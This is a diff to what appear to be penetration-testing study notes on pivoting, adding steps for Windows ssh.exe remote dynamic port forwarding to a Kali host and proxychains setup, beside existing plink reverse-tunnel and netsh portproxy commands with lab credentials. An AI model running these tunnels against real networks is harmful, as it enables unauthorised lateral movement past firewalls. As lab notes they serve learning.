@@ -46,3 +46,21 @@ cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234(dst):127.0
 netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
 netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
 ```
+###### ssh.exe
+```
+linux: 
+1. sudo systemctl start ssh
+windows: 
+1. where ssh
+2. ssh.exe -V (the version of OpenSSH bundled with Windows needs to be higher than 7.6, then we can use it for remote dynamic port forwarding)
+3. ssh -N -R 9998 kali@192.168.118.4
+linux: 
+1. ss -ntplu(check socks5 9998 port state)
+2. tail /etc/proxychains4.conf
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5 127.0.0.1 9998
+3. proxychains command
+```
